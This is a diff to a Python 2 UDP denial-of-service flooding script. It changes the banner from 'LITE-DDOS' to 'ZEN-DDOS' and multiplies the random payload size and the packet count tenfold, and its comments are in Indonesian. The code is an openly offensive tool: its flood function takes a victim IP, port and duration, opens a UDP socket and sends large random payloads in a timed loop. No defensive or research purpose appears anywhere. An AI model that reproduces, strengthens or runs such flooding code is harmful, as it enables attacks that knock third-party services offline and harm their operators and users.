@@ -4,7 +4,7 @@ import random
 import sys
 def usage():
     print "\033[1;32m#########################################################"
-    print "#------------------------[\033[1;91mLITE-DDOS\033[1;32m]---------------------#"
+    print "#------------------------[\033[1;91mZEN-DDOS\033[1;32m]---------------------#"
     print "#-------------------------------------------------------#"
     print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
@@ -23,9 +23,9 @@ def flood(victim, vport, duration):
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # 20000 representasi satu byte ke server
-    bytes = random._urandom(20000)
+    bytes = random._urandom(200000)
     timeout =  time.time() + duration
-    sent = 3000
+    sent = 30000
 
     while 1:
         if time.time() > timeout:
